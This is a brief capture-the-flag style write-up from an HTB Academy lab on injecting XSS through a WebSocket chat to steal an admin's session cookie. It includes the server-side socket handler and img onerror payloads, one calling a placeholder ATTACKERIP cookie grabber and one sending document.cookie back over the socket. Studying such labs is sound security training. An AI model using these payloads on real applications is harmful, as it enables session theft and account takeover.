In our htb accademy test we could see how we could use burpsuite to interact with WS and inject a XSS into chat as a message which we could steal the admins cookie!

## Preface:
The application was using some firewall blocks that were blocking the standard methods as hosting our PHP data grabber.
The application was using 2 different WS one for users and one for admins, but virtually doing same shit.
The inline script were blocked so we couldn't execute `<script>` tags inline but it worked if we used img tags for example!

## Back-end code:
We can see the code used by WS on **/wsadmin** endpoint to report flag
```
@sock.route('/adminws')
def adminws(sock):
    while True:
        if not to_admin.empty():
            msg = to_admin.get()
            sock.send(msg)

        msg = sock.receive(timeout=1)
        if msg:
            to_user.put(msg)
			
```

## Solutions:
We found out that a working payload was 
```
<img src=x onerror=alert('XSS');>
```
So now the solution to use for example 
```
<img src=x onerror='http://ATTACKERIP/grabber.php?c='+document.cookie;>   
```
(Will be blocked by firewall.)
So here we have to check for specific code used by web-socket in python 
```
sock.send(msg)
```
And use this to show the cookie ex 
```
<img src=x onerror=socket.send(document.cookie);>
```